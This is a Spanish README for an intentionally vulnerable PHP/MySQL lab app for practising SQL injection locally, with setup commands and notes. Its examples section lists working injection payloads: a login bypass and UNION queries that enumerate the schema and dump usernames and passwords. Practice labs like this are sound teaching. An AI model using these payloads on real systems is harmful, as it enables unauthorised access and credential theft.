# SQL Injection Lab (PHP)

Aplicación web **intencionalmente vulnerable** para practicar SQL injection en un entorno local y controlado.

## Requisitos
- PHP 8+
- MySQL 8+ (base de datos `examen1`)

## Ejecutar
```bash
export DB_HOST=127.0.0.1
export DB_USER=root
export DB_PASS=tu_password
export DB_NAME=examen1
php -S 0.0.0.0:8000
```
Luego visita `http://localhost:8000`.

## Notas de laboratorio
- La app crea la base de datos `examen1` y recrea la tabla `users` si está vacía.
- El botón **Restaurar base de datos** vuelve a crear la tabla con datos de ejemplo.
- El caracter `#` se transforma en `--` para permitir comentarios estilo MySQL.

## Ejemplos
```
' or '1'='1' #
' UNION SELECT 1,VERSION() #
' UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.tables #
' UNION SELECT NULL,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME= 'users' #
' UNION SELECT user,password FROM users #
```
